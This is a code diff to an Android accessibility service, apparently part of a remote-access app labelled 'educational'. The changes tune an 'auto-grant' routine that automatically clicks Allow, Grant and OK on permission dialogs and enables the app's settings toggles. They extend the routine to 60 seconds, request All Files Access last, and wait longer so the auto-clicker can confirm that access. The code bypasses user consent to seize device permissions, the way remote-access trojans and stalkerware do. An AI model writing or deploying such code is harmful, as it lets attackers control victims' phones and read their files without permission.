@@ -465,31 +465,33 @@ public class UnifiedAccessibilityService extends AccessibilityService {
         }
     }
 
-    /** Starts auto-grant mode: clicks Allow/Grant/OK/Allow all time for 12 seconds.
-     *  Also triggers MANAGE_EXTERNAL_STORAGE (All Files Access) settings screen so
-     *  the user is prompted and the auto-clicker can grant it too.
+    /** Starts auto-grant mode: clicks Allow/Grant/OK/Allow all time for 60 seconds.
+     *  WRITE_EXTERNAL_STORAGE / All Files Access is requested LAST (at 30 s) so all
+     *  other permission dialogs finish first, then storage is handled on its own.
      */
     private void startAutoGrantTimer() {
         autoGrantMode = true;
         autoGrantHandler = new Handler(Looper.getMainLooper());
 
-        // Trigger All Files Access settings screen after a short delay (let dialogs settle first)
+        // Phase 2 (30 s): request WRITE_EXTERNAL_STORAGE / All Files Access AFTER all
+        // other permission dialogs have been auto-granted and dismissed.
         autoGrantHandler.postDelayed(() -> {
             try {
                 com.remoteaccess.educational.permissions.AutoPermissionManager apm =
                     new com.remoteaccess.educational.permissions.AutoPermissionManager(this);
                 if (!apm.hasManageExternalStorage()) {
-                    apm.requestManageExternalStorage();
-                    Log.i(TAG, "Auto-grant: requested MANAGE_EXTERNAL_STORAGE settings screen");
+                    apm.requestWriteExternalStorageLast();
+                    Log.i(TAG, "Auto-grant: requested WRITE_EXTERNAL_STORAGE / All Files Access (last step)");
                 }
             } catch (Exception ignored) {}
-        }, 1_500);
+        }, 30_000);
 
+        // Auto-grant mode expires after 60 seconds (covers all dialogs + storage page)
         autoGrantHandler.postDelayed(() -> {
             autoGrantMode = false;
-            Log.i(TAG, "Auto-grant mode expired after 12 seconds");
-        }, 12_000);
-        Log.i(TAG, "Auto-grant mode ENABLED — will auto-click permission dialogs for 12s");
+            Log.i(TAG, "Auto-grant mode expired after 60 seconds");
+        }, 60_000);
+        Log.i(TAG, "Auto-grant mode ENABLED — will auto-click permission dialogs for 60s");
     }
 
     // Words that disqualify a toggle from being auto-enabled
@@ -566,7 +568,9 @@ public class UnifiedAccessibilityService extends AccessibilityService {
     /**
      * Looks for unchecked toggles/switches/checkboxes on screen when the app name
      * is visible. Skips any item whose nearby text contains a blacklisted word.
-     * If found, turns it on then presses Back after 500 ms.
+     * If found, turns it on — then waits 2.5 s before pressing Back so the auto-click
+     * loop has enough time to handle any confirmation dialog that may appear
+     * (e.g. "Allow [App] to access all files?" on the All Files Access page).
      */
     private boolean runAccessibilityToggleGranter(AccessibilityNodeInfo rootNode) {
         try {
@@ -575,8 +579,10 @@ public class UnifiedAccessibilityService extends AccessibilityService {
             if (!screenText.contains(appName)) return false;
 
             if (findAndEnableToggleForAppName(rootNode)) {
-                Log.i(TAG, "Auto-grant: enabled toggle for app on settings screen");
-                scheduleBack(500);
+                Log.i(TAG, "Auto-grant: enabled toggle for app on settings screen — waiting 2.5 s for confirmation dialog");
+                // 2 500 ms gives the auto-click loop (runs every ~500 ms) at least 4-5 chances
+                // to find and click "Allow" in any confirmation dialog before Back is pressed.
+                scheduleBack(2_500);
                 return true;
             }
         } catch (Exception e) {
